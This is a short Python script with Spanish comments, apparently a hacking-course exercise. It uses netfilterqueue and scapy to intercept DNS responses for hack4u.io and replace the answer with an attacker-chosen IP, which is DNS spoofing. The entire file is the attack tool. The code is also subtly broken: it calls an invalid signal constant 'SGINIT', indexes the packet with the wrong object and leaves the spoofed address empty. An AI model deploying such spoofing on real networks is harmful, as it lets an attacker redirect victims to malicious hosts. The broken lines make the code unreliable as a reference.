import netfilterqueue
import signal
import sys
import scapy.all as scapy


def def_handler(sig,frame):
    print("\n[+] Saliendo ...")
    sys.exit(1)

signal.signal(signal.SGINIT,def_handler)
def procces_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b"hack4u.io" in qname:
            print("\n Envenando el DNS hack4u.io")

            answer = scapy.DNSRR(rrname=qname, rdata="")#en rdata agregar la ip de la maquina
            scapy_packet[packet.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(scapy_packet.build())#seteando el neuvo paquete
    packet.accept() #aceptamos los paquetes
#    packet.drop() Si los queremos rechazar


queue = netfilterqueue.NetfilterQueue()
queue.bind(0,procces_packet)
queue.run()